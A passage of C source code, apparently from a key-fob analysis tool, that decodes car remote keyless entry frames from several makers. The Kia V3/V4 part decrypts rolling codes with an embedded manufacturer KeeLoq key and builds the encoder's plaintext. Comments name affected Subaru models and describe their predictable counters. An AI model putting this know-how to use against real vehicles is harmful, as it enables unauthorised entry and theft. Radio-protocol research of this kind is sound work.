    if(pt==0&&!f1){pk1=v;f1=true;}
    else if(pt==1&&!f2){pk2=v;f2=true;}
  }
  if(!f1||!f2) return false;
  uint8_t r1[9],r2[9]; uint32_t fx1,fx2;
  if(!sp2_half(pk1,r1,&fx1)) return false;
  if(!sp2_half(pk2,r2,&fx2)) return false;
  uint8_t rd[18];
  rd[0]=r2[8];rd[1]=r1[8];
  rd[2]=r2[4];rd[3]=r2[5];rd[4]=r2[6];rd[5]=r2[7];
  rd[6]=r1[4];rd[7]=r1[5];rd[8]=r1[6];rd[9]=r1[7];
  rd[10]=r2[0];rd[11]=r2[1];rd[12]=r2[2];rd[13]=r2[3];
  rd[14]=r1[0];rd[15]=r1[1];rd[16]=r1[2];rd[17]=r1[3];
  uint32_t rolling=0;
  for(int i=0;i<18;i++) rolling=rolling*3+rd[i];
  if(rolling>=0x10000000U) return false;
  uint32_t rc=0;
  for(int i=0;i<28;i++) rc|=((rolling>>i)&1U)<<(27-i);
  cnt=rc; btn=(uint8_t)(fx1>>12);
  serial=(fx1&0xFFFU)<<20|fx2;
  if(serial==0) return false;
  return true;
}

// ─── Automotive RKE Decoders — timed from published automotive remote-control frame layouts ─

// Tolerance range check (percent of reference)
static inline bool ks_inR(uint32_t v,uint32_t ref,uint32_t pct){
  uint32_t d=(v>ref)?v-ref:ref-v; return d*100<=ref*pct;
}

// Chrysler/Dodge/Jeep (2004-2010) — 80-bit OOK PWM LSB-first per byte
// bit0: ~300µs HI + ~3700µs LO  bit1: ~600µs HI + ~3400µs LO  gap: ≥9000µs
// Byte 5 check: msb==0 → raw[5]=raw[1]^0xC3  msb==1 → raw[5]=raw[1]
static bool ks_decodeChrysler(const uint32_t* buf,int cnt,uint8_t raw[10],bool& validCk){
  for(int si=0;si<cnt-161;si++){
    if(buf[si]<9000) continue;
    int j=si+1; if(j+160>cnt) continue;
    memset(raw,0,10); bool ok=true;
    for(int b=0;b<80;b++){
      uint32_t hi=buf[j+b*2];
      if(hi>=150&&hi<=450){}
      else if(hi>450&&hi<=900){raw[b/8]|=(uint8_t)(1u<<(b%8));}
      else{ok=false;break;}
    }
    if(!ok) continue;
    uint8_t msb=(raw[0]>>7)&1;
    validCk=(raw[5]==(msb?raw[1]:(uint8_t)(raw[1]^0xC3u)));
    return true;
  }
  return false;
}

// Subaru legacy RKE (Impreza/Forester/Legacy ~2000-2010) — 48-bit LSB-first PWM
// Sync: ~8000µs LOW, start-bit: ~600µs HI; 1=600HI+200LO, 0=200HI+600LO
// Checksum: nibble-XOR of fixId bytes ^ ctr ^ btn
static bool ks_decodeSubaru(const uint32_t* buf,int cnt,uint32_t& fixId,uint8_t& ctr,uint8_t& btn,bool& valid){
  for(int si=0;si<cnt-100;si++){
    if(!ks_inR(buf[si],8000,22)) continue;
    if(si+3+96>cnt||!ks_inR(buf[si+1],600,22)) continue;
    uint64_t word=0; bool ok=true;
    for(int b=0;b<48;b++){
      uint32_t h=buf[si+3+b*2];
      if(ks_inR(h,600,22))      word|=(uint64_t)1<<b;
      else if(ks_inR(h,200,22)) {}
      else{ok=false;break;}
    }
    if(!ok) continue;
    fixId=(uint32_t)(word&0xFFFFFFFFu);
    ctr=(uint8_t)((word>>32)&0xFFu); btn=(uint8_t)((word>>44)&0xFu);
    uint8_t rx_ck=(uint8_t)((word>>40)&0xFu),c=0;
    for(int i=0;i<4;i++) c^=(fixId>>(i*8))&0xFF;
    c^=ctr^(btn&0xF); valid=(rx_ck==(c&0xF)); return true;
  }
  return false;
}

// Mazda Siemens VDO (Mazda3/6/CX-7 ~2003-2009) — 72-bit MSB-first
// Sync: ~450µs HI + ~14400µs LO; constant HI=450µs; bit1=1350µs LO, bit0=450µs LO
// Bit timing uses a 450 µs high pulse. The decoder checks five data bytes.
static bool ks_decodeMazda(const uint32_t* buf,int cnt,uint32_t& hop,uint32_t& serial,uint8_t& ctr,uint8_t& btn,bool& valid){
  for(int si=0;si<cnt-146;si++){
    if(!ks_inR(buf[si],14400,20)) continue;
    if(si==0||!ks_inR(buf[si-1],450,25)) continue;
    int j=si+1; if(j+144>cnt) continue;
    uint8_t pkt[9]={0}; bool ok=true;
    for(int b=0;b<72;b++){
      uint32_t lo=buf[j+b*2+1];
      if(ks_inR(lo,1350,20))     pkt[b/8]|=(uint8_t)(1u<<(7-(b%8)));
      else if(ks_inR(lo,450,25)) {}
      else{ok=false;break;}
    }
    if(!ok) continue;
    hop=((uint32_t)pkt[0]<<24)|((uint32_t)pkt[1]<<16)|((uint32_t)pkt[2]<<8)|pkt[3];
    serial=((uint32_t)pkt[4]<<16)|((uint32_t)pkt[5]<<8)|pkt[6];
    ctr=pkt[7]; btn=pkt[8]>>4; uint8_t rx_ck=pkt[8]&0xFu,c=0;
    for(int i=0;i<4;i++) c^=(hop>>(i*8))&0xFF;
    for(int i=0;i<3;i++) c^=(serial>>(i*8))&0xFF;
    c^=ctr^(btn&0xF); valid=(rx_ck==(c&0xF)); return true;
  }
  return false;
}

// VAG pre-2004 (VW/Audi/Seat/Skoda ID48 era) — 64-bit MSB-first PWM rolling
// Sync: ~550µs HI + ~11000µs LO; 1=550HI+250LO, 0=250HI+550LO
// Checksum: inverted byte-sum of preceding 7 bytes
static bool ks_decodeVAG(const uint32_t* buf,int cnt,uint32_t& tid,uint16_t& ctr,uint8_t& btn,bool& valid){
  for(int si=0;si<cnt-130;si++){
    if(!ks_inR(buf[si],11000,20)) continue;
    if(si==0||!ks_inR(buf[si-1],550,25)) continue;
    int j=si+1; if(j+128>cnt) continue;
    uint64_t word=0; bool ok=true;
    for(int b=63;b>=0;b--){
      uint32_t hi=buf[j+(63-b)*2];
      if(ks_inR(hi,550,25))      word|=(uint64_t)1<<b;
      else if(ks_inR(hi,250,25)) {}
      else{ok=false;break;}
    }
    if(!ok) continue;
    tid=(uint32_t)(word>>32); ctr=(uint16_t)((word>>16)&0xFFFF);
    btn=(uint8_t)((word>>8)&0xFF); uint8_t rx_ck=(uint8_t)(word&0xFF),s=0;
    s+=(tid>>24)&0xFF; s+=(tid>>16)&0xFF; s+=(tid>>8)&0xFF; s+=tid&0xFF;
    s+=(ctr>>8)&0xFF;  s+=ctr&0xFF; s+=btn;
    valid=(rx_ck==(uint8_t)(~s)); return true;
  }
  return false;
}

// Hyundai / Kia RIO early (~2001-2008) — 64-bit fixed-code MSB-first
// Sync: ~312µs HI + ~10400µs LO; 1=728HI+312LO, 0=312HI+728LO
// Checksum: ~(serial XOR serial>>16 XOR btnMask)
static bool ks_decodeHKR(const uint32_t* buf,int cnt,uint32_t& serial,uint16_t& btnMask,bool& valid){
  for(int si=0;si<cnt-130;si++){
    if(!ks_inR(buf[si],10400,20)) continue;
    if(si==0||!ks_inR(buf[si-1],312,25)) continue;
    int j=si+1; if(j+128>cnt) continue;
    uint64_t word=0; bool ok=true;
    for(int b=63;b>=0;b--){
      uint32_t hi=buf[j+(63-b)*2];
      if(ks_inR(hi,728,20))      word|=(uint64_t)1<<b;
      else if(ks_inR(hi,312,25)) {}
      else{ok=false;break;}
    }
    if(!ok) continue;
    serial=(uint32_t)(word>>32); btnMask=(uint16_t)((word>>16)&0xFFFF);
    uint16_t rx_ck=(uint16_t)(word&0xFFFF);
    uint16_t c=(uint16_t)((serial^(serial>>16))^btnMask);
    valid=(rx_ck==(uint16_t)(~c)); return true;
  }
  return false;
}

// Hyundai Santa Fe / Solaris 2013-2016 (TRW fob) — 80-bit MSB-first, CRC8 poly=0x31
// Sync: ~375µs HI + ~12000µs LO; 1=375HI+125LO, 0=125HI+375LO
static uint8_t ks_crc8_31(const uint8_t* d,int n){
  uint8_t c=0xFF;
  for(int i=0;i<n;i++){c^=d[i];for(int b=0;b<8;b++){c=(c&0x80)?(uint8_t)((c<<1)^0x31):(uint8_t)(c<<1);}}
  return c;
}
static bool ks_decodeSantaFe(const uint32_t* buf,int cnt,uint32_t& rolling,uint32_t& serial,uint8_t& ctr,uint8_t& btn,bool& valid){
  for(int si=0;si<cnt-162;si++){
    if(!ks_inR(buf[si],12000,20)) continue;
    if(si==0||!ks_inR(buf[si-1],375,25)) continue;
    int j=si+1; if(j+160>cnt) continue;
    uint8_t pkt[10]={0}; bool ok=true;
    for(int b=0;b<80;b++){
      uint32_t lo=buf[j+b*2+1];
      if(ks_inR(lo,125,30))      pkt[b/8]|=(uint8_t)(1u<<(7-(b%8)));
      else if(ks_inR(lo,375,25)) {}
      else{ok=false;break;}
    }
    if(!ok) continue;
    rolling=((uint32_t)pkt[0]<<24)|((uint32_t)pkt[1]<<16)|((uint32_t)pkt[2]<<8)|pkt[3];
    serial=((uint32_t)pkt[4]<<16)|((uint32_t)pkt[5]<<8)|pkt[6];
    ctr=pkt[7]; btn=pkt[8];
    valid=(pkt[9]==ks_crc8_31(pkt,9)); return true;
  }
  return false;
}

// ─── KIA/HYU V0 — 61-bit OOK PWM rolling code ────────────────────────────────
// TE_short=250µs, TE_long=500µs, TE_delta=100µs.
// Frame: preamble (>15 SHORT+SHORT pairs) → start-bit LONG+LONG (bit59=1) →
//        60 data bits (SHORT=0, LONG=1) → stop (HI≥700µs).
// 64-bit layout (bits [59:0] populated, bit [60] is implicit 0 swallowed by preamble):
//   [59:56] preamble=0xF  [55:40] counter(16)  [39:12] serial(28)
//   [11:8]  button(4)     [7:0]   CRC8 poly=0x7F init=0x00
// CRC covers bytes [data>>48 .. data>>8] (6 bytes).
static uint8_t ks_kia_crc8(const uint8_t* d, int n){
  uint8_t crc=0x00;
  for(int i=0;i<n;i++){
    crc^=d[i];
    for(int j=0;j<8;j++) crc=(crc&0x80)?(uint8_t)((crc<<1)^0x7F):(uint8_t)(crc<<1);
  }
  return crc;
}
static bool ks_decodeKiaV0(const uint32_t* buf,int cnt,
    uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid){
  const uint32_t TE_S=250,TE_L=500,TE_D=100;
  for(int si=0;si<cnt-30;si++){
    if(!ks_inR(buf[si],TE_S,40)) continue;
    // Count consecutive SHORT+SHORT header pairs
    int j=si,hc=0;
    while(j+1<cnt&&ks_inR(buf[j],TE_S,40)&&ks_inR(buf[j+1],TE_S,40)){hc++;j+=2;}
    if(hc<=15) continue;
    // Start bit: first LONG+LONG after header (this IS bit 59 = 1 from 0xF preamble)
    if(j+1>=cnt) continue;
    if(!ks_inR(buf[j],TE_L,40)||!ks_inR(buf[j+1],TE_L,40)) continue;
    j+=2;
    if(j+118>cnt) continue;
    // Reconstruct 60-bit data word: start bit at position 59, then bits 58..0
    uint64_t data=(uint64_t)1<<59;
    bool ok=true; int b;
    for(b=58;b>=0;b--){
      if(j+1>=cnt){ok=false;break;}
      uint32_t hi=buf[j]; j++;
      if(hi>=TE_L+2*TE_D){break;}  // stop bit — exit early (b>-1 if premature)
      j++;                          // skip LO (don't validate, just advance)
      if     (ks_inR(hi,TE_L,40)) data|=(uint64_t)1<<b;
      else if(ks_inR(hi,TE_S,40)) {}
      else   {ok=false;break;}
    }
    if(!ok||b!=-1) continue;
    // Validate preamble [59:56] = 0xF
    if(((data>>56)&0xF)!=0xF) continue;
    ctr   =(uint16_t)((data>>40)&0xFFFF);
    serial=(uint32_t)((data>>12)&0x0FFFFFFF);
    btn   =(uint8_t) ((data>> 8)&0x0F);
    uint8_t rx_crc=(uint8_t)(data&0xFF);
    uint8_t cb[6]={(uint8_t)(data>>48),(uint8_t)(data>>40),
                   (uint8_t)(data>>32),(uint8_t)(data>>24),
                   (uint8_t)(data>>16),(uint8_t)(data>> 8)};
    valid=(ks_kia_crc8(cb,6)==rx_crc);
    if(!valid) continue;  // require CRC OK — strong 8-bit check
    return true;
  }
  return false;
}

// ─── KIA/HYU V1 — 57-bit OOK Manchester rolling code ────────────────────────
// TE_short=500µs, TE_long=1000µs. Preamble: >70 TE_long+TE_long pairs.
// Frame (57 bits, MSB-first in Manchester-decoded bitstring):
//   bit [56]=1 (start)  [55:24]=serial(32)  [23:16]=btn(8)
//   [15:8]=cnt_low(8)   [7:4]=cnt_high(4)   [3:0]=CRC4
// CRC4 = nibble-XOR of 6 bytes {serial[3:0], btn, cnt_low} + offset.
// Offset: cnt_high==0 → (cnt>=0x98)?btn:1; cnt_high>=6 → use 7-byte form; else 1.
static uint8_t ks_kia_v1_crc4(const uint8_t* d,int n,uint8_t offset){
  uint8_t crc=0;
  for(int i=0;i<n;i++){uint8_t b=d[i]; crc^=((b&0x0F)^(b>>4));}
  return (uint8_t)((crc+offset)&0x0F);
}
static bool ks_decodeKiaV1(const char* mb,int ml,
    uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid){
  if(ml<57) return false;
  for(int s=0;s+57<=ml;s++){
    if(mb[s]!='1') continue;           // start bit must be 1
    uint64_t data=0;
    for(int i=0;i<57;i++) if(mb[s+i]=='1') data|=(uint64_t)1<<(56-i);
    uint32_t sn =(uint32_t)(data>>24);
    uint8_t  bn =(uint8_t)((data>>16)&0xFF);
    uint8_t  clo=(uint8_t)((data>> 8)&0xFF);
    uint8_t  chi=(uint8_t)((data>> 4)&0x0F);
    uint8_t  rx4=(uint8_t)(data&0x0F);
    uint16_t cv =(uint16_t)((chi<<8)|clo);
    if(sn==0||sn==0xFFFFFFFFUL) continue;
    if(bn==0||bn>0x0F)          continue;
    uint8_t cb6[6]={(uint8_t)(sn>>24),(uint8_t)(sn>>16),
                    (uint8_t)(sn>> 8),(uint8_t)sn,
                    bn,clo};
    uint8_t calc4;
    if(chi>=6){
      uint8_t cb7[7]={cb6[0],cb6[1],cb6[2],cb6[3],cb6[4],cb6[5],chi};
      calc4=ks_kia_v1_crc4(cb7,7,1);
    } else {
      uint8_t off=(chi==0)?((cv>=0x098)?bn:1):1;
      calc4=ks_kia_v1_crc4(cb6,6,off);
    }
    if(calc4!=rx4) continue;
    serial=sn; ctr=cv; btn=bn; valid=true; return true;
  }
  return false;
}

// ─── Subaru V2 — 80-bit Manchester OOK (published 2017 framing) ───────────────
// OOK, Manchester-encoded at ~987 baud,
// TE_H≈1013µs per half-symbol.  Affected vehicles (NA only):
//   2006 Subaru Baja; 2004-2011 Impreza; 2005-2010 Forester/Legacy/Outback.
// Preamble: ≥8 equal ~1013µs raw alternating-bit pulses.
// Sync gap: LO ~4-5×TE_H (4×1013µs preamble-end + 1×1013µs first-half of 0x55
//           MSB=0, merged = ~5065µs; search 3000-5500µs to tolerate edge jitter).
// Packet (10 bytes, MSB-first, Manchester-decoded):
//   B0=0x55 (start/sync byte, always)
//   B1-B4   device ID (24-bit serial in B1-B3)
//   B5/B6   command nibble [3:0] — must match; LOCK=1 UNLOCK=2 TRUNK=0xB PANIC=0xA
//   B7-B9   rolling code: (B7<<12)|(B8<<4)|(B9>>4) — 20-bit sequential counter
//   B9[3:0] checksum = (XOR of all nibbles except B9_lo) + 1, &0xF
// Counter increments by exactly +1 per press; ks_estDelta reliably returns delta=1.
static uint8_t ks_sub2_csum(const uint8_t* p){
  uint8_t cs=0;
  for(int i=0;i<9;i++){cs^=(uint8_t)(p[i]&0xF);cs^=(uint8_t)((p[i]>>4)&0xF);}
  cs^=(uint8_t)((p[9]>>4)&0xF);
  return (uint8_t)((cs+1U)&0xF);
}
static bool ks_decodeSubaruV2(const uint32_t* buf,int cnt,
    uint32_t& serial,uint8_t& btn,uint16_t& ctr,bool& valid){
  for(int si=8;si<cnt-165;si++){
    uint32_t gp=buf[si];
    if(gp<3000||gp>5500) continue;              // sync gap: 4-5×TE_H LO
    // Preamble check: ≥8 preceding pulses all ≈TE_H (1013µs, ±25%)
    int pc=0;
    for(int j=si-1;j>=0&&j>si-20;j--){
      if(ks_inR(buf[j],1013,25)) pc++; else break;
    }
    if(pc<8) continue;
    // Manchester decode from buf[si+1].  buf[si]=LO → buf[si+1]=HI.
    // 0x55 MSB=0: first half LO is merged into gap → start phase=1, first_half=LO(0).
    int phase=1,first_half=0;
    uint8_t pkt[10]; int bpos=0; uint8_t cb=0; int bidx=0; bool err=false;
    for(int i=si+1;i<cnt&&bpos<10;i++){
      uint32_t pw=buf[i];
      int pol=((i-si)&1)?1:0;                   // HI(1) or LO(0), strictly alternates
      bool is_s=ks_inR(pw,1013,25);             // half-symbol ≈1013µs
      bool is_f=ks_inR(pw,2026,25);             // full-symbol ≈2026µs (merged halves)
      if(!is_s&&!is_f){err=true;break;}
      if(is_s){
        if(phase==0){first_half=pol;phase=1;}
        else{cb=(uint8_t)((cb<<1)|first_half);bidx++;
          if(bidx==8){pkt[bpos++]=cb;cb=0;bidx=0;}phase=0;}
      } else {                                   // is_f: emit pending bit, keep phase=1
        if(phase==0){first_half=pol;phase=1;}    // long at bit start → treat as half
        else{cb=(uint8_t)((cb<<1)|first_half);bidx++;
          if(bidx==8){pkt[bpos++]=cb;cb=0;bidx=0;}
          first_half=pol;}                       // second half of long = first half of next
      }
    }
    if(err||bpos<10) continue;
    if(pkt[0]!=0x55) continue;                  // start byte
    uint8_t ca=(uint8_t)(pkt[5]&0xF),cb2=(uint8_t)(pkt[6]&0xF);
    if(ca!=cb2) continue;                        // command nibbles must match
    if(ks_sub2_csum(pkt)!=(pkt[9]&0xF)) continue;
    btn=ca;
    ctr=(uint16_t)(((uint32_t)pkt[7]<<12)|((uint32_t)pkt[8]<<4)|(pkt[9]>>4));
    serial=((uint32_t)pkt[1]<<16)|((uint32_t)pkt[2]<<8)|pkt[3];
    valid=true;
    return true;
  }
  return false;
}

// ─── Ford V0 — 80-bit OOK Manchester rolling code, GF(2) CRC ─────────────────
// TE_short=250µs, TE_long=500µs. Preamble: ≥4 SHORT+LONG pairs; GAP≈3500µs.
// Frame (80-bit MSB-first, Manchester-decoded): key1(64-bit) + key2(16-bit).
// key2[15:8]=key2_hi, key2[7:0]=CRC^0x80.  GF(2) matrix CRC over buf[1..8]+key2_hi.
// Decode: XOR-scramble using parity_bit(key2_hi), then byte-mix buf[6]/buf[7].
// Fields: serial=byte-reversed buf[1..4], btn=(buf[5]>>3)&0xF, count=buf[5:3]|buf[6:8]|buf[7].
static const uint8_t ks_fv0_mat[64]={
  0xDA,0xB5,0x55,0x6A,0xAA,0xAA,0xAA,0xD5,
  0xB6,0x6C,0xCC,0xD9,0x99,0x99,0x99,0xB3,
  0x71,0xE3,0xC3,0xC7,0x87,0x87,0x87,0x8F,
  0x0F,0xE0,0x3F,0xC0,0x7F,0x80,0x7F,0x80,
  0x00,0x1F,0xFF,0xC0,0x00,0x7F,0xFF,0x80,
  0x00,0x00,0x00,0x3F,0xFF,0xFF,0xFF,0x80,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7F,
  0x23,0x12,0x94,0x84,0x35,0xF4,0x55,0x84,
};
static uint8_t ks_fv0_gf2crc(const uint8_t* b9){
  uint8_t crc=0;
  for(int r=0;r<8;r++){
    uint8_t xs=0;
    for(int c=0;c<8;c++) xs^=(ks_fv0_mat[r*8+c]&b9[c+1]);
    uint8_t p=xs; p^=p>>4; p^=p>>2; p^=p>>1; p&=1;
    if(p) crc|=(uint8_t)(1u<<r);
  }
  return crc;
}
static bool ks_decodeFordV0(const char* mb,int ml,
    uint32_t& serial,uint8_t& btn,uint32_t& count){
  if(ml<80) return false;
  for(int s=0;s+80<=ml;s++){
    uint64_t k1=0; uint16_t k2=0;
    for(int i=0;i<64;i++) if(mb[s+i]=='1') k1|=(uint64_t)1<<(63-i);
    for(int i=0;i<16;i++) if(mb[s+64+i]=='1') k2|=(uint16_t)1<<(15-i);
    uint8_t b9[9];
    for(int i=0;i<8;i++) b9[i]=(uint8_t)(k1>>(56-i*8));
    b9[8]=(uint8_t)(k2>>8);
    // A constant run is never a frame. Without this, the 80-bit window slides into the
    // long unmodulated tail VW Polo captures end on and the CRC7 passes trivially: measured
    // 136 passing offsets per Polo file, all with 0 or 1 bit transitions across the whole
    // window. Real frames here have ~50. The CRC alone cannot separate the two because a
    // constant run satisfies it by construction.
    { int tr=0; for(int i=1;i<80;i++) if(mb[s+i]!=mb[s+i-1]) tr++;
      if(tr<8) continue; }
    if((ks_fv0_gf2crc(b9)&0x7F)!=((uint8_t)((k2&0xFF)^0x80)&0x7F)) continue;
    uint8_t buf8[8];
    for(int i=0;i<8;i++) buf8[i]=(uint8_t)(k1>>(56-i*8));
    uint8_t bk8=(uint8_t)(k2>>8);
    uint8_t tmp=bk8,par=0; uint8_t pany=(bk8!=0);
    while(tmp){par^=(tmp&1);tmp>>=1;}
    uint8_t pb=pany?par:0;
    uint8_t xb=pb?buf8[7]:buf8[6];
    int lim=pb?7:6;
    for(int idx=1;idx<lim;idx++) buf8[idx]^=xb;
    if(!pb) buf8[7]^=xb;
    uint8_t ob7=buf8[7];
    buf8[7]=(ob7&0xAA)|(buf8[6]&0x55);
    buf8[6]=(buf8[6]&0xAA)|(ob7&0x55);
    uint32_t sle=((uint32_t)buf8[1])|((uint32_t)buf8[2]<<8)|
                 ((uint32_t)buf8[3]<<16)|((uint32_t)buf8[4]<<24);
    serial=((sle&0xFF)<<24)|(((sle>>8)&0xFF)<<16)|
           (((sle>>16)&0xFF)<<8)|((sle>>24)&0xFF);
    btn=(buf8[5]>>3)&0x0F;
    count=((uint32_t)(buf8[5]&0x07)<<16)|((uint32_t)buf8[6]<<8)|buf8[7];
    if(serial==0) continue;
    return true;
  }
  return false;
}

// ─── KIA/HYU V7 — 64-bit OOK Manchester FM rolling code ─────────────────────
// TE_short=250µs, TE_long=500µs. Preamble: ≥16 HI+LO SHORT pairs.
// Frame (64-bit MSB-first, Manchester-decoded):
//   [63:56]=header(0x4C)  [55:40]=counter(16)  [39:12]=serial(28)
//   [11:8]=button(4)       [7:0]=CRC8 poly=0x7F init=0x4C (over bytes 0..6)
static bool ks_decodeKiaV7(const char* mb,int ml,
    uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid){
  if(ml<64) return false;
  for(int s=0;s+64<=ml;s++){
    uint64_t data=0;
    for(int i=0;i<64;i++) if(mb[s+i]=='1') data|=(uint64_t)1<<(63-i);
    if((uint8_t)(data>>56)!=0x4Cu) continue;
    uint16_t cv=(uint16_t)(data>>40);
    uint32_t sn=(uint32_t)((data>>12)&0x0FFFFFFFUL);
    uint8_t  bn=(uint8_t)((data>>8)&0x0F);
    uint8_t  rxc=(uint8_t)(data&0xFF);
    if(sn==0||sn==0x0FFFFFFFUL||bn==0) continue;
    uint8_t pkt[7];
    pkt[0]=(uint8_t)(data>>56); pkt[1]=(uint8_t)(data>>48);
    pkt[2]=(uint8_t)(data>>40); pkt[3]=(uint8_t)(data>>32);
    pkt[4]=(uint8_t)(data>>24); pkt[5]=(uint8_t)(data>>16);
    pkt[6]=(uint8_t)(data>>8);
    uint8_t crc=0x4C;
    for(int i=0;i<7;i++){
      crc^=pkt[i];
      for(int j=0;j<8;j++) crc=(crc&0x80)?(uint8_t)((crc<<1)^0x7F):(uint8_t)(crc<<1);
    }
    if(crc!=rxc) continue;
    serial=sn; ctr=cv; btn=bn; valid=true; return true;
  }
  return false;
}

// ─── KIA/HYU V3/V4 — 68-bit OOK PWM rolling code, KeeLoq (CRC4) ──────────────
// The one Kia variant FOBworks can actually *decrypt*, because its manufacturer
// key is public. The same value is the Kia_V3_V4_OEM entry in
// MFR_KEYS above, and its sources are recorded in `research/01` §2.
//
// IMPORTANT — this must NOT be routed through ks_parseKL. That parser assumes an
// HCS 66-bit frame with the discriminator at sn[15:4] and the button in the low
// nibble. Kia V3/V4 is a different frame on every axis that matters:
//   · 68 bits, not 66
//   · the 28-bit serial sits at bits [27:0] of the *plaintext*, not a 12-bit disc
//   · every payload byte is individually bit-reversed
//   · V3 inverts the whole frame; V4 does not
// Feeding it to ks_parseKL silently corrupts every field.
//
// Frame layout, from the reference. Raw bits accumulate big-endian:
//     byte_idx = n/8, bit_idx = 7 - (n%8)
//     b[0..3]  encrypted hopping code, each byte bit-reversed
//     b[4..7]  serial|button, each byte bit-reversed
//     b[8]hi   CRC4 (extracted, never validated by the reference — see below)
//
// Physical layer: PWM, te_short 400 µs, te_long 800 µs, te_delta 150 µs,
// 315/433.92 MHz, AM and FM both occur.
//
// Bit encoding: bit 1 -> first pulse short, second long; bit 0 -> the reverse.
// V3 and V4 differ only by which *level* leads (V3 high-first, V4 low-first) and
// by the V3 frame inversion. FOBworks stores pulse *widths* only, so the leading
// level is not observable here — the width pattern for a given bit is identical
// in both versions. The inversion is therefore the only discriminator available,
// which is why both interpretations are attempted rather than the polarity being
// guessed from a preamble (the reference uses `is_v3_sync`; a width-only capture
// cannot supply it).
//
// CRC4 is deliberately NOT validated. The reference reads it and never checks it;
// the encoder brute-forces it over 16 values (`crc_iter`), which implies a
// receiver-side check whose polynomial is unpublished. Guessing a polynomial
// would be worse than not checking: it would reject valid frames. The 12-bit
// decrypt check below is the gate.

// Stored masked, like MFR_KEYS; ks_unmaskMfrKey is applied at each use below.
#define KIA_V34_MF_KEY  0xCC88E6C23CEC0269ULL
#define KIA_V34_TE_SHORT 400u
#define KIA_V34_TE_LONG  800u
#define KIA_V34_TE_DELTA 150u
#define KIA_V34_MIN_BITS 68

// 8-bit reverse, matching the reference's rev8.
static inline uint8_t ks_kiaV34Rev8(uint8_t v){
  v = (uint8_t)((v >> 4) | (v << 4));
  v = (uint8_t)(((v & 0xCC) >> 2) | ((v & 0x33) << 2));
  v = (uint8_t)(((v & 0xAA) >> 1) | ((v & 0x55) << 1));
  return v;
}

// The V3/V4 validation predicate: 4 bits of button + 8 bits of serial LSB.
// This is NOT ks_klSnMatch — that compares 12-bit discriminators, a field this
// protocol does not have. Reusing it here would check the wrong bits.
//
// Like the HCS discriminator check this is 12 bits, so a wrong key passes with
// probability ~1/4096. The candidate space here is a single fixed key, so that
// is ~0.024% per frame — low enough not to need the two-frame gate for
// correctness, but the gate still runs so a single frame is never reported as
// `crypto-confirmed` (see the reporting rule at the call site).
static inline bool ks_kiaV34Match(uint32_t dec,uint8_t btn,uint32_t serial){
  return ((dec >> 28) & 0x0F) == (btn & 0x0F)
      && ((dec >> 16) & 0xFF) == (serial & 0xFF);
}

// Extract fields from 8 payload bytes + the CRC byte. `invert` applies the V3
// whole-frame inversion first. This is the pure field-extraction half, shared by
// the pulse decoder and the synthetic self-test.
static void ks_kiaV34Extract(uint8_t b[8],uint8_t crcByte,bool invert,KiaV34Frame& out){
  uint8_t w[8];
  for(int i=0;i<8;i++) w[i] = invert ? (uint8_t)~b[i] : b[i];
  // CRC4 lives in the high nibble of the ninth byte. Not validated — see above.
  uint8_t c = invert ? (uint8_t)~crcByte : crcByte;
  out.crc = (uint8_t)((c >> 4) & 0x0F);
  out.encrypted = ((uint32_t)ks_kiaV34Rev8(w[3]) << 24) |
                  ((uint32_t)ks_kiaV34Rev8(w[2]) << 16) |
                  ((uint32_t)ks_kiaV34Rev8(w[1]) <<  8) |
                   (uint32_t)ks_kiaV34Rev8(w[0]);
  // The serial's top byte is masked to 0xF0 *before* reversal — not a plain
  // MSB-first read.
  out.serial = ((uint32_t)ks_kiaV34Rev8((uint8_t)(w[7] & 0xF0)) << 24) |
               ((uint32_t)ks_kiaV34Rev8(w[6]) << 16) |
               ((uint32_t)ks_kiaV34Rev8(w[5]) <<  8) |
                (uint32_t)ks_kiaV34Rev8(w[4]);
  out.btn = (uint8_t)((ks_kiaV34Rev8(w[7]) & 0xF0) >> 4);
}

// Decrypt and apply the 12-bit predicate. Returns true and fills ctr when the
// frame validates for this interpretation.
static bool ks_kiaV34Validate(KiaV34Frame& f){
  f.decrypted = ks_klDecrypt(f.encrypted, ks_unmaskMfrKey(KIA_V34_MF_KEY));
  if(!ks_kiaV34Match(f.decrypted, f.btn, f.serial)){
    f.validated = false;
    return false;
  }
  f.ctr = (uint16_t)(f.decrypted & 0xFFFF);
  f.validated = true;
  return true;
}

// Build the 32-bit plaintext the Kia encoder actually encrypts. This is NOT
// ks_klBuildPlain, and it is also NOT the on-air serial framing.
//
// The reference keeps these two layouts deliberately different, which is easy to
// conflate (doc 06 §2.6 does, and the mistake overruns the button field):
//   on-air  bytes 4..7: (serial & 0x0FFFFFFF) | (btn << 28)   — full 28-bit serial
//   encrypted word    : (cnt & 0xFFFF) | ((serial & 0x3FF) << 16) | (btn << 28)
// Only the serial's low 10 bits enter the encrypted word. That is what makes the
// decoder's 8-bit check work: serial[7:0] lands at bits[23:16], exactly where
// (decrypted >> 16) & 0xFF reads it.
//
// Using the on-air form here would shift 28 bits of serial into bits[43:16] of a
// 32-bit word — the top bits are lost and the surviving serial bits overwrite the
// button nibble at bits[31:28], so every frame with serial >= 0x3FF fails
// validation. Caught by the A1 round-trip.
static inline uint32_t ks_kiaV34BuildPlain(uint8_t btn,uint32_t serial,uint16_t ctr){
  return (uint32_t)(ctr & 0xFFFF)
       | ((serial & 0x3FFUL) << 16)
       | ((uint32_t)(btn & 0x0F) << 28);
}

// Absolute-tolerance pulse match. The Kia spec's tolerance is a fixed ±te_delta
// (150 µs), not a percentage, so ks_inR (which is percentage-based) is not the
// right helper here: ±150 µs is ±37.5% of 400 but ±18.75% of 800, so a single
// percentage would be wrong for one of the two widths.
static inline bool ks_kiaV34IsPulse(uint32_t v,uint32_t ref){
  uint32_t d = (v>ref) ? v-ref : ref-v;
  return d <= KIA_V34_TE_DELTA;
}

// ─── Kia V3/V4 two-press confirmation ───────────────────────────────────────
// The HCS gate (ks_klAgree*) is keyed on the HCS sn namespace (a 16-bit
// (disc<<4)|btn packing) and on hop-code inequality. Kia V3/V4 has a 28-bit
// serial in the same numeric range, so sharing those arrays would let one
// protocol's state confirm the other's frame. This is a deliberately separate,
// minimal gate for the single known Kia key.
//
// It exists to keep reporting honest, not to fix a false-positive problem: the
// Kia candidate space is one fixed key, so a spurious 12-bit match is ~1/4096
// per frame. One frame is therefore a candidate; two frames from the same fob
// with different hop codes promote it to confirmed.
